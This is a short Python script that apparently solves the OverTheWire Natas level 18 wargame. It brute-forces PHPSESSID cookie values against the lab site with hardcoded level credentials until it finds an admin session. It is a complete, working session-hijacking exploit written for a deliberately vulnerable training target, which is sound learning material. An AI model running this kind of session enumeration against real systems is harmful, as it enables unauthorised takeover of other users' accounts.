#!/usr/bin/env python3
import requests

auth_username = 'natas18'
auth_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
admin_str = 'You are an admin.'

url = 'http://natas18.natas.labs.overthewire.org/index.php'

for i in range(1,641):
    cookies = { 'PHPSESSID': str(i) }
    r = requests.get(url, cookies=cookies, auth=(auth_username,auth_password))

    if admin_str in r.text:
        print(r.text)
        break